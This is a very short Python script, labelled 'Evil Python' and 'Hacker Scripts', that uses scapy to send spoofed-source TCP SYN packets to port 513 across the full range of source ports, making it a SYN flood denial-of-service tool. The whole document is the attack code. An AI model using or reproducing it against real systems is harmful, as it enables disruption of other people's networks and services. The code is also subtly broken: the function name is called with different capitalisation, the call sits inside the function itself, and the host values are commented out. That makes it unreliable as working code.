#Evil Python
#Hacker Scripts

from scapy.all import *
def synflood(src,tgt):
	for sport in range(1024, 65535):
		IPlayer = IP(src=src, dst=tgt)
		TCPlayer = TCP(sport=sport, dport=513)
		pkt = IPlayer / TCPlayer
		send(pkt)
	#src = "host"
	#tgt = "target"
	synFlood(src,tgt)